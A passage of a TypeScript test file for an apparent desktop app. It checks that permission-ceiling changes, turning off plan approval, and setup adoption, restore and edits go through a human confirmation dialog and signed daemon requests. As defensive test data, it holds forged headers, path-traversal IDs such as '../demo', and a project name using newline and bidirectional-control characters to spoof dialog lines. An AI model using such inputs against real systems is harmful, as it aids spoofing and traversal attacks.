		// The renderer cannot pick the base version or add headers.
		const result = await changeRule({ ...request, baseVersion: 9, headers: { [LADO_PRESENCE_HEADER]: "v1.forged" } });

		expect(result).toEqual({ status: "changed", rule: changedCeiling });
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({
				type: "question",
				message: "Change the permission ceiling?",
				detail:
					"Auto → Bypass permissions\n\nNo LADO run goes above this mode. " +
					"Tasks approved under the current rules need a new approval.",
				buttons: ["Cancel", "Change"],
				defaultId: 0,
				cancelId: 0,
				noLink: true,
			}),
		);
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}${rulePath}`],
			["PATCH", `${BASE}${rulePath}`],
		]);
		expectSigned(calls[1]!, "PATCH", `{"baseVersion":2,"ceiling":{"mode":"bypass-permissions"}}`);
	});

	it("sends nothing when the human cancels or nothing would change", async () => {
		const cancelled = setup();
		cancelled.dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(cancelled.changeRule(request)).resolves.toEqual({ status: "cancelled" });
		expect(cancelled.calls.map(({ init }) => init.method)).toEqual(["GET"]);

		const same = setup();
		await expect(same.changeRule({ ruleId: CEILING, ceiling: { mode: "auto" } })).resolves.toEqual({
			status: "changed",
			rule: ceilingRule(),
		});
		expect(same.dialog.showMessageBox).not.toHaveBeenCalled();
		expect(same.calls.map(({ init }) => init.method)).toEqual(["GET"]);
	});

	it("refuses a rule change from an untrusted sender", async () => {
		const { changeRule, dialog, fetch } = setup();
		await expect(changeRule(request, { id: 99 })).resolves.toMatchObject({
			status: "error",
			code: "LADO_PRESENCE_UNTRUSTED_SENDER",
		});
		expect(fetch).not.toHaveBeenCalled();
		expect(dialog.showMessageBox).not.toHaveBeenCalled();
	});

	it("refuses to change a rule that is not the permission ceiling", async () => {
		for (const input of [
			{ ruleId: "plan.approval.required", ceiling: { mode: "auto" } },
			{ ruleId: "team.rule", ceiling: { mode: "auto" } },
			{ ruleId: CEILING, ceiling: { mode: "default" } },
			{ ruleId: CEILING },
			{ ruleId: CEILING, mode: "auto" },
			null,
		]) {
			const { changeRule, dialog, fetch } = setup();
			await expect(changeRule(input), JSON.stringify(input)).resolves.toMatchObject({
				status: "error",
				code: "LADO_RULE_CEILING_INVALID",
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}

		// The daemon's answer decides, not the id the renderer sent.
		for (const answer of [ceilingRule({ protected: false }), ceilingRule({ id: "team.rule" })]) {
			const { changeRule, calls, dialog } = setup({}, { rule: () => json(200, { rule: answer, versions: [] }) });
			await expect(changeRule(request)).resolves.toMatchObject({ status: "error", code: "LADO_RULE_CEILING_INVALID" });
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
			expect(calls.map(({ init }) => init.method)).toEqual(["GET"]);
		}
	});

	it("repairs a ceiling without a valid mode", async () => {
		const broken = ceilingRule({ ceiling: undefined });
		const { changeRule, calls, dialog } = setup({}, { rule: () => json(200, { rule: broken, versions: [] }) });
		await expect(changeRule(request)).resolves.toEqual({ status: "changed", rule: changedCeiling });
		expect(dialogOptions(dialog).detail?.split("\n")[0]).toBe("— → Bypass permissions");
		expectSigned(calls[1]!, "PATCH", `{"baseVersion":2,"ceiling":{"mode":"bypass-permissions"}}`);
	});

	it("returns the daemon's refusal of the change", async () => {
		const { changeRule } = setup({}, {
			patch: () =>
				json(409, {
					error: "conflict",
					code: "LADO_RULE_CHANGED",
					message: "The rule changed since you opened it.",
					details: { baseVersion: 2 },
				}),
		});
		await expect(changeRule(request)).resolves.toEqual({
			status: "error",
			code: "LADO_RULE_CHANGED",
			message: "The rule changed since you opened it.",
			details: { baseVersion: 2 },
		});
	});

	it("words the change from main's catalog in the current language", async () => {
		const { changeRule, dialog } = setup({ locale: () => "ko" });
		await changeRule(request);
		const ko = trayCatalogs.ko;
		expect(dialogOptions(dialog)).toMatchObject({
			message: ko["lado.presence.ruleChangeTitle"],
			buttons: [ko["lado.presence.cancel"], ko["lado.presence.change"]],
			detail: ko["lado.presence.ceilingChangeDetail"]
				.replace("{{from}}", ko["lado.presence.mode.auto"])
				.replace("{{to}}", ko["lado.presence.mode.bypassPermissions"]),
		});
	});
});

// LADO fork: turning LADO mode off lets the project's workers start without
// an approved plan, so only the human may do it.
describe("turning LADO mode off", () => {
	const settingsPath = "/api/v1/lado/projects/demo/settings";

	it("reads the project from the daemon, confirms, then signs the change", async () => {
		const { setMode, calls, dialog, window } = setup();
		// The renderer cannot name the project for the dialog or add headers.
		const result = await setMode({
			projectId: "demo",
			ladoMode: false,
			name: "Some other project",
			headers: { [LADO_PRESENCE_HEADER]: "v1.forged" },
		});

		expect(result).toEqual({ status: "changed", settings: settingsResponse(false) });
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({
				type: "question",
				message: "Turn off LADO mode for Demo app?",
				// What turning it off allows, then what happens to the queue and the runs.
				detail:
					"Project ID: demo\n\nAfter that, this project's workers can start without an approved plan. " +
					"Queued tasks wait until it is on again; running workers keep running.",
				buttons: ["Cancel", "Turn off"],
				defaultId: 0,
				cancelId: 0,
				noLink: true,
			}),
		);
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}${settingsPath}`],
			["GET", `${BASE}/api/v1/projects/demo`],
			["PUT", `${BASE}${settingsPath}`],
		]);
		expectSigned(calls[2]!, "PUT", `{"ladoMode":false}`);
	});

	it("sends nothing when the human cancels or the mode is already off", async () => {
		const cancelled = setup();
		cancelled.dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(cancelled.setMode({ projectId: "demo", ladoMode: false })).resolves.toEqual({ status: "cancelled" });
		expect(cancelled.calls.map(({ init }) => init.method)).toEqual(["GET", "GET"]);

		const off = setup({}, { settings: () => json(200, settingsResponse(false)) });
		await expect(off.setMode({ projectId: "demo", ladoMode: false })).resolves.toEqual({
			status: "changed",
			settings: settingsResponse(false),
		});
		expect(off.dialog.showMessageBox).not.toHaveBeenCalled();
		expect(off.calls.map(({ init }) => init.method)).toEqual(["GET"]);
	});

	it("refuses to turn LADO mode on, which the renderer does itself", async () => {
		for (const input of [{ projectId: "demo", ladoMode: true }, { projectId: "demo" }, { projectId: "demo", ladoMode: "false" }]) {
			const { setMode, dialog, fetch } = setup();
			await expect(setMode(input), JSON.stringify(input)).resolves.toMatchObject({
				status: "error",
				code: "LADO_MODE_CHANGE_INVALID",
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}
	});

	it("refuses an untrusted sender and an invalid project id", async () => {
		const untrusted = setup();
		await expect(untrusted.setMode({ projectId: "demo", ladoMode: false }, { id: 99 })).resolves.toMatchObject({
			status: "error",
			code: "LADO_PRESENCE_UNTRUSTED_SENDER",
		});
		expect(untrusted.fetch).not.toHaveBeenCalled();
		expect(untrusted.dialog.showMessageBox).not.toHaveBeenCalled();

		for (const projectId of [undefined, 7, "", "../demo", "a..b", "-demo", "de mo", "demo/x", "demo?x", "x".repeat(256)]) {
			const { setMode, dialog, fetch } = setup();
			await expect(setMode({ projectId, ladoMode: false }), String(projectId)).resolves.toMatchObject({
				status: "error",
				code: "LADO_PROJECT_ID_INVALID",
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}
	});

	it("does not ask when the daemon's answers about the project cannot be read", async () => {
		const unreadable: [string, Routes, string | undefined][] = [
			[
				"an unknown project",
				{ settings: () => json(404, { error: "not_found", code: "PROJECT_NOT_FOUND", message: "Unknown project" }) },
				"PROJECT_NOT_FOUND",
			],
			["another project's settings", { settings: () => json(200, { ...settingsResponse(), projectId: "other" }) }, UNREADABLE],
			["settings without a mode", { settings: () => json(200, { projectId: "demo", maxConcurrent: 1 }) }, UNREADABLE],
			["another project", { project: () => json(200, { status: "ok", project: { ...projectResponse().project, id: "other" } }) }, UNREADABLE],
			["an unreachable daemon", { project: () => Promise.reject(new TypeError("fetch failed")) }, "SERVICE_UNAVAILABLE"],
		];
		for (const [name, routes, code] of unreadable) {
			const { setMode, calls, dialog } = setup({}, routes);
			const result = await setMode({ projectId: "demo", ladoMode: false });
			expect(result, name).toMatchObject({ status: "error" });
			expect(result.status === "error" ? result.code : "", name).toBe(code);
			expect(dialog.showMessageBox, name).not.toHaveBeenCalled();
			expect(calls.every(({ init }) => init.method === "GET"), name).toBe(true);
		}
	});

	it("returns the daemon's refusal of the change", async () => {
		const { setMode } = setup({}, {
			put: () =>
				json(403, {
					error: "forbidden",
					code: "LADO_PRESENCE_EXPIRED",
					message: "The confirmation expired. Approve again in the AO desktop app.",
				}),
		});
		await expect(setMode({ projectId: "demo", ladoMode: false })).resolves.toEqual({
			status: "error",
			code: "LADO_PRESENCE_EXPIRED",
			message: "The confirmation expired. Approve again in the AO desktop app.",
		});
	});

	it("names the project ID and what turning the mode off allows, in every language", async () => {
		for (const locale of ["en", "zh-CN", "ja", "ko", "es", "fr", "de", "pt-BR"] as const) {
			const { setMode, dialog } = setup({ locale: () => locale });
			await setMode({ projectId: "demo", ladoMode: false });
			const detail = dialogOptions(dialog).detail ?? "";
			expect(detail, locale).toBe(trayCatalogs[locale]["lado.presence.modeOffDetail"].replace("{{id}}", "demo"));
			// "ID", not "id", whatever the language.
			expect(detail.split("\n")[0], locale).toMatch(/\bID\b|-ID\b/);
		}
		expect(trayCatalogs.ko["lado.presence.modeOffDetail"]).toBe(
			"프로젝트 ID: {{id}}\n\n그 뒤로 이 프로젝트의 워커는 승인한 계획 없이도 시작할 수 있습니다. " +
				"대기열의 작업은 LADO 모드를 다시 켤 때까지 기다리고, 실행 중인 워커는 계속 실행됩니다.",
		);
	});

	it("keeps a project name from faking the dialog's lines, in the current language", async () => {
		const name = "Demo\nProject ID: other\u202e";
		const { setMode, dialog } = setup({ locale: () => "ko" }, { project: () => json(200, projectResponse(name)) });
		await setMode({ projectId: "demo", ladoMode: false });
		const ko = trayCatalogs.ko;
		expect(dialogOptions(dialog)).toMatchObject({
			message: ko["lado.presence.modeOffTitle"].replace("{{project}}", "Demo Project ID: other"),
			detail: ko["lado.presence.modeOffDetail"].replace("{{id}}", "demo"),
			buttons: [ko["lado.presence.cancel"], ko["lado.presence.turnOff"]],
		});
		expect(dialogOptions(dialog).message).not.toBe(trayCatalogs.en["lado.presence.modeOffTitle"]);
	});
});

// LADO fork: adoption moves the developer's own setup out of the tools'
// folders, so only the human may start it (step 7 plan §14).
describe("adopting local setup", () => {
	const adoptionsPath = "/api/v1/lado/setup/adoptions";
	const previewBody = JSON.stringify({ entries: setupEntries, dryRun: true });
	const adoptBody = JSON.stringify({ entries: setupEntries, planSha256: PLAN_SHA });

	it("previews the entries itself, names what moves, then signs that plan", async () => {
		const { adoptSetup, calls, dialog, window } = setup();
		// The renderer cannot pick the plan, add fields to an entry or add headers.
		const result = await adoptSetup({
			entries: setupEntries.map((entry) => ({ ...entry, managedPath: "/elsewhere" })),
			planSha256: "f".repeat(64),
			headers: { [LADO_PRESENCE_HEADER]: "v1.forged" },
		});

		expect(result).toEqual({ status: "adopted", adoption: adopted });
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["POST", `${BASE}${adoptionsPath}`],
			["POST", `${BASE}${adoptionsPath}`],
		]);
		expectUnsigned(calls[0]!, "POST", previewBody);
		expectSigned(calls[1]!, "POST", adoptBody);
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({
				type: "question",
				message: "Adopt this local setup?",
				detail:
					"Items to move: Claude Code 2, Codex 1\nLeft in place: 1\nplan sha256 eeeeeeeeeeee\n\n" +
					"Claude Code and Codex used outside this app no longer load the moved items. A backup is kept, and Restore puts them back.",
				buttons: ["Cancel", "Adopt"],
				defaultId: 0,
				cancelId: 0,
				noLink: true,
			}),
		);
	});

	it("sends nothing when the human cancels", async () => {
		const { adoptSetup, calls, dialog } = setup();
		dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(adoptSetup({ entries: setupEntries })).resolves.toEqual({ status: "cancelled" });
		expect(calls).toHaveLength(1);
		expectUnsigned(calls[0]!, "POST", previewBody);
	});

	it("refuses entries the daemon does not take, before asking it anything", async () => {
		const entry = setupEntries[0]!;
		for (const input of [
			null,
			{},
			{ entries: [] },
			{ entries: "skills/review" },
			{ entries: [{ ...entry, tool: "cursor" }] },
			{ entries: [{ ...entry, kind: "plugin" }] },
			{ entries: [{ ...entry, action: "delete" }] },
			{ entries: [{ ...entry, name: "" }] },
			{ entries: [{ ...entry, name: 7 }] },
			{ entries: [{ ...entry, name: "x".repeat(1025) }] },
			{ entries: [{ tool: entry.tool, kind: entry.kind, name: entry.name }] },
			{ entries: Array.from({ length: 501 }, (_, i) => ({ ...entry, name: `skill-${i}` })) },
		]) {
			const { adoptSetup, dialog, fetch } = setup();
			await expect(adoptSetup(input), JSON.stringify(input).slice(0, 80)).resolves.toMatchObject({
				status: "error",
				code: "LADO_SETUP_ADOPTION_INVALID",
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}
	});

	it("does not ask about a command it cannot rewrite, and counts the other blocking conflicts", async () => {
		const moved = adoptionPreview({
			conflicts: [
				{ acceptanceId: "", code: "LADO_SETUP_DENIES_GIT", contentSha256: "", detail: "", details: {}, itemId: "", path: "", severity: "warning" },
				{
					acceptanceId: "",
					code: "LADO_SETUP_HOOK_PATH_MOVED",
					contentSha256: "",
					detail: "Stop hooks/check.sh",
					details: { event: "Stop", path: "hooks/check.sh" },
					itemId: "",
					path: "/home/dev/.claude/settings.json#hooks",
					severity: "blocking",
				},
			],
		});
		const refused = setup({}, { adoptPreview: () => json(200, moved) });
		await expect(refused.adoptSetup({ entries: setupEntries })).resolves.toEqual({
			status: "error",
			code: "LADO_SETUP_HOOK_PATH_MOVED",
			message:
				"A command names a file that would move, and LADO cannot rewrite it. Move the setting that holds it too, or keep the file in place.",
			details: { event: "Stop", path: "hooks/check.sh" },
		});
		expect(refused.dialog.showMessageBox).not.toHaveBeenCalled();
		expect(refused.calls).toHaveLength(1);

		// A setting left in place that names a moved file stops it the same way.
		const inPlace = adoptionPreview({
			conflicts: [
				{
					acceptanceId: "",
					code: "LADO_SETUP_PATH_USED_IN_PLACE",
					contentSha256: "",
					detail: "",
					details: { key: "env.HELPER", path: "bin/helper.sh", origin: "/home/dev/.claude/settings.json#env" },
					itemId: "",
					path: "/home/dev/.claude/settings.json#env",
					severity: "blocking",
				},
			],
		});
		const stopped = setup({}, { adoptPreview: () => json(200, inPlace) });
		await expect(stopped.adoptSetup({ entries: setupEntries })).resolves.toMatchObject({
			status: "error",
			code: "LADO_SETUP_PATH_USED_IN_PLACE",
			details: { key: "env.HELPER", path: "bin/helper.sh" },
		});
		expect(stopped.dialog.showMessageBox).not.toHaveBeenCalled();

		// The same setup left in place has these too, and adopted it can be turned off or fixed.
		const blocked = adoptionPreview({
			conflicts: [
				{ acceptanceId: "", code: "LADO_SETUP_MCP_NAME_TAKEN", contentSha256: "", detail: "", details: {}, itemId: "", path: "", severity: "blocking" },
				{ acceptanceId: "", code: "LADO_SETUP_DENIES_AO", contentSha256: "", detail: "", details: {}, itemId: "", path: "", severity: "blocking" },
				{ acceptanceId: "", code: "LADO_SETUP_HOOK_SHARES_AO_EVENT", contentSha256: "", detail: "", details: {}, itemId: "", path: "", severity: "info" },
			],
		});
		const counted = setup({}, { adoptPreview: () => json(200, blocked) });
		await expect(counted.adoptSetup({ entries: setupEntries })).resolves.toEqual({ status: "adopted", adoption: adopted });
		expect(dialogOptions(counted.dialog).detail?.split("\n\n").slice(-1)).toEqual([
			"Blocking conflicts: 2. LADO tasks stay blocked until you turn off or fix the items that cause them.",
		]);
		expectSigned(counted.calls[1]!, "POST", adoptBody);
	});

	it("does not ask about an adoption the daemon would refuse", async () => {
		const kept = setupEntries.map((entry) => ({ ...entry, action: "keep" as const }));
		const refusals: [string, ReturnType<typeof adoptionPreview>, unknown[], string, Record<string, unknown> | undefined][] = [
			["nothing moves", adoptionPreview({}, kept), kept, "LADO_SETUP_ADOPTION_INVALID", undefined],
			[
				"an unverified OS",
				adoptionPreview({
					os: "darwin",
					preconditions: { ok: false, os: "darwin", processes: [], processesIgnored: false, sessions: [], unverified: ["claude-code", "codex"] },
				}),
				setupEntries,
				"LADO_SETUP_OS_UNVERIFIED",
				{ os: "darwin", tools: ["claude-code", "codex"] },
			],
			[
				"running tools",
				adoptionPreview({
					preconditions: {
						ok: false,
						os: "linux",
						processes: [{ name: "codex", pid: 4242, tool: "codex" }],
						processesIgnored: false,
						sessions: [{ id: "demo-7", tool: "claude-code" }],
						unverified: [],
					},
				}),
				setupEntries,
				"LADO_SETUP_TOOL_RUNNING",
				{ sessions: [{ id: "demo-7", tool: "claude-code" }], processes: [{ name: "codex", pid: 4242, tool: "codex" }] },
			],
		];
		for (const [name, preview, entries, code, details] of refusals) {
			const { adoptSetup, calls, dialog } = setup({}, { adoptPreview: () => json(200, preview) });
			const result = await adoptSetup({ entries });
			expect(result, name).toMatchObject({ status: "error", code });
			if (details) expect(result, name).toMatchObject({ details });
			expect(dialog.showMessageBox, name).not.toHaveBeenCalled();
			expect(calls, name).toHaveLength(1);
		}
	});

	it("does not ask when the preview cannot be read as the entries asked for", async () => {
		const [first, second, third] = setupEntries;
		const unreadable: [string, Route, string | undefined][] = [
			[
				"a refused entry",
				() => json(400, { error: "bad_request", code: "LADO_SETUP_NOT_ADOPTABLE", message: "LADO cannot adopt this entry.", details: { reason: "symlink" } }),
				"LADO_SETUP_NOT_ADOPTABLE",
			],
			["no plan hash", () => json(200, adoptionPreview({ planSha256: "" })), UNREADABLE],
			["a short plan hash", () => json(200, adoptionPreview({ planSha256: "e".repeat(63) })), UNREADABLE],
			["a missing entry", () => json(200, adoptionPreview({}, [first!, second!, third!])), UNREADABLE],
			["another action", () => json(200, adoptionPreview({}, setupEntries.map((entry) => ({ ...entry, action: "move" as const })))), UNREADABLE],
			["an entry twice", () => json(200, adoptionPreview({}, [first!, first!, second!, third!])), UNREADABLE],
			["no preconditions", () => json(200, { ...adoptionPreview(), preview: { ...adoptionPreview().preview, preconditions: undefined } }), UNREADABLE],
			["an unreachable daemon", () => Promise.reject(new TypeError("fetch failed")), "SERVICE_UNAVAILABLE"],
		];
		for (const [name, adoptPreview, code] of unreadable) {
			const { adoptSetup, calls, dialog } = setup({}, { adoptPreview });
			const result = await adoptSetup({ entries: setupEntries });
			expect(result, name).toMatchObject({ status: "error" });
			expect(result.status === "error" ? result.code : "", name).toBe(code);
			expect(dialog.showMessageBox, name).not.toHaveBeenCalled();
			expect(calls, name).toHaveLength(1);
		}
	});

	it("returns the daemon's refusal of the adoption", async () => {
		const { adoptSetup } = setup({}, {
			adopt: () =>
				json(500, {
					error: "internal",
					code: "LADO_SETUP_ADOPTION_FAILED",
					message: "The adoption stopped while removing originals.",
					details: { stage: "remove", adoption: "adoption-1", state: "partial" },
				}),
		});
		await expect(adoptSetup({ entries: setupEntries })).resolves.toEqual({
			status: "error",
			code: "LADO_SETUP_ADOPTION_FAILED",
			message: "The adoption stopped while removing originals.",
			details: { stage: "remove", adoption: "adoption-1", state: "partial" },
		});
	});

	it("words the adoption from main's catalog in the current language", async () => {
		const { adoptSetup, dialog } = setup({ locale: () => "ko" });
		await adoptSetup({ entries: setupEntries });
		const ko = trayCatalogs.ko;
		expect(dialogOptions(dialog)).toMatchObject({
			message: ko["lado.presence.setupAdoptTitle"],
			buttons: [ko["lado.presence.cancel"], ko["lado.presence.setupAdopt"]],
			detail: ko["lado.presence.setupAdoptDetail"]
				.replace("{{claude}}", "2")
				.replace("{{codex}}", "1")
				.replace("{{kept}}", "1")
				.replace("{{sha}}", "eeeeeeeeeeee"),
		});
		expect(dialogOptions(dialog).message).not.toBe(trayCatalogs.en["lado.presence.setupAdoptTitle"]);
	});
});

describe("restoring local setup", () => {
	const adoptionPath = "/api/v1/lado/setup/adoptions/adoption-1";
	const adoptedAt = (locale: string) =>
		new Intl.DateTimeFormat(locale, { dateStyle: "medium", timeStyle: "short" }).format(new Date("2026-10-26T00:00:00Z"));

	it("reads the adoption, names how many items go back, then signs the restore", async () => {
		const { restoreSetup, calls, dialog, window } = setup();
		// The renderer cannot add a body or headers.
		const result = await restoreSetup({ adoptionId: "adoption-1", body: "{}", headers: { [LADO_PRESENCE_HEADER]: "v1.forged" } });

		expect(result).toEqual({ status: "restored", restore: restored });
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["GET", `${BASE}${adoptionPath}`],
			["POST", `${BASE}${adoptionPath}/restore`],
		]);
		// The daemon checks the proof against an empty body.
		expectSigned(calls[1]!, "POST", "");
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({
				type: "question",
				message: "Restore this adoption?",
				// When the adoption ran, as the app's language writes it, not its id.
				detail:
					`Adopted: ${adoptedAt("en")}\nItems to put back where they were: 3\n\n` +
					"Where something new is at a path now, the original goes beside it. Sessions AO starts no longer get these items.",
				buttons: ["Cancel", "Restore"],
			}),
		);
	});

	it("counts what an adoption interrupted before it recorded its items moved", async () => {
		const entry = (name: string, action: "move" | "keep") =>
			({ action, kind: "skill", name, path: `skills/${name}`, root: "claude_dir", sha256: SHA, size: 1, tool: "claude-code", type: "dir" }) as const;
		const interrupted = { ...adoptionDetail({ itemCount: 0, state: "partial" }), items: [], backup: [entry("a", "move"), entry("b", "keep"), entry("c", "move")] };
		const { restoreSetup, dialog } = setup({}, { adoption: () => json(200, interrupted) });
		await expect(restoreSetup({ adoptionId: "adoption-1" })).resolves.toMatchObject({ status: "restored" });
		expect(dialogOptions(dialog).detail?.split("\n")[1]).toBe("Items to put back where they were: 2");
	});

	it("sends nothing when the human cancels", async () => {
		const { restoreSetup, calls, dialog } = setup();
		dialog.showMessageBox.mockResolvedValueOnce({ response: 0, checkboxChecked: false });
		await expect(restoreSetup({ adoptionId: "adoption-1" })).resolves.toEqual({ status: "cancelled" });
		expect(calls.map(({ init }) => init.method)).toEqual(["GET"]);
	});

	it("refuses an invalid adoption id and an untrusted sender", async () => {
		for (const input of [null, {}, { adoptionId: 7 }, { adoptionId: "" }, { adoptionId: "../adoption-1" }, { adoptionId: "x".repeat(129) }]) {
			const { restoreSetup, dialog, fetch } = setup();
			await expect(restoreSetup(input), JSON.stringify(input)).resolves.toMatchObject({
				status: "error",
				code: "LADO_SETUP_ADOPTION_ID_INVALID",
			});
			expect(fetch).not.toHaveBeenCalled();
			expect(dialog.showMessageBox).not.toHaveBeenCalled();
		}
		const untrusted = setup();
		await expect(untrusted.restoreSetup({ adoptionId: "adoption-1" }, { id: 99 })).resolves.toMatchObject({
			code: "LADO_PRESENCE_UNTRUSTED_SENDER",
		});
		expect(untrusted.fetch).not.toHaveBeenCalled();
	});

	it("does not ask about a restore the daemon would refuse or an answer it cannot read", async () => {
		const refusals: [string, Route, string | undefined, Record<string, unknown> | undefined][] = [
			[
				"a restored adoption",
				() => json(200, adoptionDetail({ restoredAt: "2026-10-26T01:00:00Z" })),
				"LADO_SETUP_ALREADY_RESTORED",
				{ adoption: "adoption-1" },
			],
			["an unreadable backup", () => json(200, adoptionDetail({}, false)), "LADO_SETUP_RESTORE_FAILED", { adoption: "adoption-1", stage: "manifest" }],
			[
				"an unknown adoption",
				() => json(404, { error: "not_found", code: "LADO_SETUP_NOT_FOUND", message: "LADO has no such adoption." }),
				"LADO_SETUP_NOT_FOUND",
				undefined,
			],
			[
				"the tools running",
				() =>
					json(
						200,
						adoptionDetail({}, true, {
							...nothingRunning,
							ok: false,
							sessions: [{ id: "ses-1", tool: "claude-code" }],
							processes: [{ pid: 42, name: "codex", tool: "codex" }],
						}),
					),
				"LADO_SETUP_TOOL_RUNNING",
				{ sessions: [{ id: "ses-1", tool: "claude-code" }], processes: [{ pid: 42, name: "codex", tool: "codex" }] },
			],
			["another adoption", () => json(200, adoptionDetail({ id: "adoption-2" })), UNREADABLE, undefined],
			["no items", () => json(200, { ...adoptionDetail(), items: undefined }), UNREADABLE, undefined],
		];
		for (const [name, adoption, code, details] of refusals) {
			const { restoreSetup, calls, dialog } = setup({}, { adoption });
			const result = await restoreSetup({ adoptionId: "adoption-1" });
			expect(result, name).toMatchObject({ status: "error" });
			expect(result.status === "error" ? result.code : "", name).toBe(code);
			if (details) expect(result, name).toMatchObject({ details });
			expect(dialog.showMessageBox, name).not.toHaveBeenCalled();
			expect(calls.map(({ init }) => init.method), name).toEqual(["GET"]);
		}
	});

	it("words the restore from main's catalog in the current language", async () => {
		const { restoreSetup, dialog } = setup({ locale: () => "ko" });
		await restoreSetup({ adoptionId: "adoption-1" });
		const ko = trayCatalogs.ko;
		expect(dialogOptions(dialog)).toMatchObject({
			message: ko["lado.presence.setupRestoreTitle"],
			buttons: [ko["lado.presence.cancel"], ko["lado.presence.setupRestore"]],
			detail: ko["lado.presence.setupRestoreDetail"].replace("{{when}}", adoptedAt("ko")).replace("{{count}}", "3"),
		});
	});
});

describe("changing local setup", () => {
	const itemsPath = "/api/v1/lado/setup/items";
	const create = {
		method: "POST",
		path: itemsPath,
		body: { tool: "claude-code", kind: "mcp_server", name: "search", content: { type: "http", url: "https://search" } },
	};
	const createBody = JSON.stringify(create.body);

	it("previews the change, names the item, then signs exactly the request", async () => {
		const { changeSetup, calls, dialog, window } = setup();
		// The renderer cannot add headers; main sends the body it checked.
		const result = await changeSetup({ ...create, headers: { [LADO_PRESENCE_HEADER]: "v1.forged" } });

		expect(result).toEqual({ status: "changed", change: changePreview({ applied: true, actor: "human" }) });
		expect(calls.map(({ url, init }) => [init.method, url])).toEqual([
			["POST", `${BASE}${itemsPath}`],
			["POST", `${BASE}${itemsPath}`],
		]);
		expectUnsigned(calls[0]!, "POST", JSON.stringify({ ...create.body, dryRun: true }));
		expectSigned(calls[1]!, "POST", createBody);
		expect(dialog.showMessageBox).toHaveBeenCalledWith(
			window,
			expect.objectContaining({
				type: "question",
				message: "Confirm this local setup change?",
				detail:
					"Claude Code · MCP server · search\nNew item\nchange sha256 777777777777\n\n" +
					"This item can run commands or widen access, so every change to it is confirmed here.",
				buttons: ["Cancel", "Change"],
				defaultId: 0,
				cancelId: 0,
				noLink: true,
			}),
		);
	});

	it("names what each route changes and signs its own body", async () => {
		const cases: [string, Record<string, unknown>, ChangeResponse, string][] = [
			[
				"an edit",
				{ method: "PATCH", path: `${itemsPath}/item-1`, body: { baseVersion: 2, content: { allow: ["Bash(ls)"] } } },
				changePreview({ op: "edit", item: setupItem({ kind: "setting", name: "permissions" }) }),
				"Claude Code · Setting · permissions\nNew version",
			],
			[
				"turning on at Global",
				{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", scope: "global", state: "on" } },
				changePreview({ op: "binding", item: setupItem({ kind: "hook_script", name: "check.sh" }) }),
				"Claude Code · Hook script · check.sh\nTurn on at Global",
			],
			[
				"turning on for a project",
				{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", scope: "project", scopeId: "demo", state: "force_on" } },
				changePreview({ op: "binding", item: setupItem({ tool: "codex" }) }),
				"Codex · MCP server · search\nTurn on for project demo",
			],
			[
				"turning on for a task",
				{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", scope: "task", scopeId: "lado-task-1", state: "force_on" } },
				changePreview({ op: "binding", item: setupItem() }),
				"Claude Code · MCP server · search\nTurn on for task lado-task-1",
			],
			[
				"turning off at Global",
				{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", scope: "global", scopeId: "", state: "off" } },
				changePreview({ op: "binding", item: setupItem({ kind: "hook_script", name: "check.sh" }) }),
				"Claude Code · Hook script · check.sh\nTurn off at Global",
			],
			[
				"turning off for a project",
				{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", scope: "project", scopeId: "demo", state: "force_off" } },
				changePreview({ op: "binding", item: setupItem() }),
				"Claude Code · MCP server · search\nTurn off for project demo",
			],
			[
				"turning off for a task",
				{ method: "PUT", path: "/api/v1/lado/setup/bindings", body: { itemId: "item-1", scope: "task", scopeId: "lado-task-1", state: "force_off" } },
				changePreview({ op: "binding", item: setupItem() }),
				"Claude Code · MCP server · search\nTurn off for task lado-task-1",
			],
			[
				"keeping drift",
				{ method: "POST", path: `${itemsPath}/item-1/drift`, body: { action: "keep", sha256: DRIFT_SHA } },
				changePreview({ op: "drift_keep", item: setupItem({ kind: "setting", name: "hooks" }) }),
				"Claude Code · Setting · hooks\nKeep the edit made in the managed folder",
			],
		];
		for (const [name, request, preview, lines] of cases) {
			const { changeSetup, calls, dialog } = setup({}, { changePreview: () => json(200, preview) });
			const result = await changeSetup(request);
			expect(result, name).toMatchObject({ status: "changed" });
			expect(dialogOptions(dialog).detail?.split("\n").slice(0, 2).join("\n"), name).toBe(lines);
			expect(calls.map(({ url, init }) => [init.method, new URL(url).pathname]), name).toEqual([
				[request.method, request.path],
				[request.method, request.path],
			]);
			expectUnsigned(calls[0]!, String(request.method), JSON.stringify({ ...(request.body as object), dryRun: true }));
			expectSigned(calls[1]!, String(request.method), JSON.stringify(request.body));
		}
	});

	it("names what inheriting turns the item to, read from the daemon", async () => {
		const cases: [string, Record<string, unknown>, Route, string, string][] = [
			// The project follows Global, which has the item on.
			["a project", { scope: "project", scopeId: "demo" }, () => json(200, { items: [scopeItem()] }), "/api/v1/lado/setup/items?projectId=demo", "Follow Global for project demo, which turns it on"],
			// The task follows its project, which forces the item off.
